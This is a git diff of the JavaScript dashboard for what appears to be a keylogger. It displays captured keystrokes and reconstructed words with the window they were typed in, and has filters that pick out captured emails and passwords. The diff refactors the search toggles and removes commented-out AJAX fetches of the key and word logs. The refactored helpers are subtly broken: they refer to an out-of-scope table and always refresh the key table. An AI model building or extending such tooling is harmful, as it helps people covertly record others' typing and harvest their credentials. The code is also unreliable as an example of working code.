@@ -39,25 +39,20 @@ $(document).ready(function(){
     // ======================
     var keyTable = $('#tableKeypresses').DataTable();
     $('#keydownToggle').change(function () {
+        var keyDownQuery = "isKeyDown"
         if (this.checked) {
-            addSearchParameter(keySearches, "isKeyDown")
-            keyTable.search(generateSearchQuery(keySearches)).draw();
+            addSearchParameter(keySearches, keyDownQuery)
         } else {
-            removeSearchParameter(keySearches, "isKeyDown")
-            keyTable.search(generateSearchQuery(keySearches)).draw();
+            removeSearchParameter(keySearches, keyDownQuery)
         }
     });
 
     $('#noneToggle').change(function () {
+        var noneQuery = "^((?!None).)*$"
         if (this.checked) {
-            // wordTable.search("isPassword").draw();
-            addSearchParameter(keySearches, "^((?!None).)*$")
-            wordTable.search(
-                generateSearchQuery(keySearches),true
-            ).draw();
+            addSearchParameter(keySearches, noneQuery)
         } else {
-            removeSearchParameter(keySearches, "None")
-            wordTable.search(generateSearchQuery(keySearches)).draw();
+            removeSearchParameter(keySearches, noneQuery)
         }
     });
 
@@ -69,58 +64,73 @@ $(document).ready(function(){
     var wordTable = $('#tableWords').DataTable();
     
     $('#emailToggle').change(function () {
+        var emailQuery = "isEmail"
         if (this.checked) {
-            addSearchParameter(wordSearches, "isEmail")
-            wordTable.search(generateSearchQuery(wordSearches)).draw();
+            addSearchParameter(wordSearches, emailQuery)
         } else {
-            removeSearchParameter(wordSearches, "isEmail")
-            wordTable.search(generateSearchQuery(wordSearches)).draw();
+            removeSearchParameter(wordSearches, emailQuery)
         }
     });
 
     $('#passwordToggle').change(function () {
+        var passwordQuery = "isPassword"
         if (this.checked) {
-            // wordTable.search("isPassword").draw();
-            addSearchParameter(wordSearches, "isPassword")
-            wordTable.search(generateSearchQuery(wordSearches)).draw();
+            addSearchParameter(wordSearches, passwordQuery)
         } else {
-            removeSearchParameter(wordSearches, "isPassword")
-            wordTable.search(generateSearchQuery(wordSearches)).draw();
+            removeSearchParameter(wordSearches, passwordQuery)
         }
     });
 
     
 })
 
+
+
+// =========================
+// =
+// =        Searching
+// =
+// =========================
 // Searches are stored as strings inside an array
 var keySearches = new Set();
 var wordSearches = new Set();
 
 // When passed into datatable, these strings will become a single string,
 //      with each element separated by a space (" ")
+
+// Add search parameter for table
 function addSearchParameter(set, query) {
     set.add(query);
+    updateTable(keyTable, keySearches);
+
 }
 
+// Remove search parameter for table
 function removeSearchParameter(set, query) {
     set.delete(query);
+    updateTable(keyTable, keySearches);
+
 }
 
+// Convert SET of search queries into string
 function generateSearchQuery(set) {
-    strArr = []
-
+    strArr = [] // store in temporary array
     for (str of set) {
         strArr.push(str);
     }
-
     return strArr.join(" ")
+}
+
+// Refresh table with updated search parameters
+function updateTable(table, searchSet) {
+    table.search(generateSearchQuery(searchSet), true).draw();
 }
 
 // =========================
 // =
 // =        Keys
 // =
-// ========================
+// =========================
 class Key {
     constructor(datetime, isKeyDown, windowName, processedKey) {
         this.datetime = datetime;
@@ -152,44 +162,6 @@ function getKeyData() {
 
     return res
 }
-  
-  // request and display all the keys collected
-// function showKeys() {
-//     res = []
-//     console.log("res at start:" + res);
-//     $.ajax({
-//       url: "./showKeylog",
-//       method: "GET",
-//       dataType: 'json',
-//       success: (data) => {
-//           console.log("res before: " + res);
-//           res = data;
-//           console.log("res after: " + res);
-
-//       },
-//       fail: console.log("Failed to show key log")
-//     });
-//     console.log("res outside: " + res);
-//     return getKeyData(res)
-// }
-
-// function showKeyTable(keys){
-//     $('#keyAll > table > tbody').empty();
-//     keys.forEach((item) => {
-//         $('#keyAll > table > tbody').append(
-//             '<tr><td>'
-//             + item.datetime
-//             +'</td><td>'
-//             + item.isKeyDown
-//             +'</td><td>'
-//             + item.windowName
-//             +'</td><td>'
-//     	    + item.processedKey
-//     	    +'</td></tr>'
-//         )
-//     })
-// }
-
 
 
 // =========================
@@ -236,35 +208,5 @@ function getWordData() {
 
     return res
 }
-// // request and display all the words collected
-// function showWords() {
-//     $.ajax({
-//       url: "./showWordlog",
-//       method: "GET",
-//       dataType: 'json',
-//       success: showWordTable,
-//       fail: console.log("Failed to show word log")
-//     });
-//     console.log("help");
-// }
-  
-// function showWordTable(words){
-//     $('#wordAll > table > tbody').empty();
-//     $.each(words, function(key, item){
-//         console.log(item)
-//         $('#wordAll > table > tbody').append(
-//             '<tr><td>'
-//             + item.datetime
-//             +'</td><td>'
-//             + item.windowName
-//             +'</td><td>'
-//             + item.processedWord
-//             +'</td><td>'
-//     	    + item.isEmail
-//     	    +'</td><td>'
-//     	    + item.isPassword
-//     	    +'</td></tr>'
-//         )
-//     })
-// }
+
 
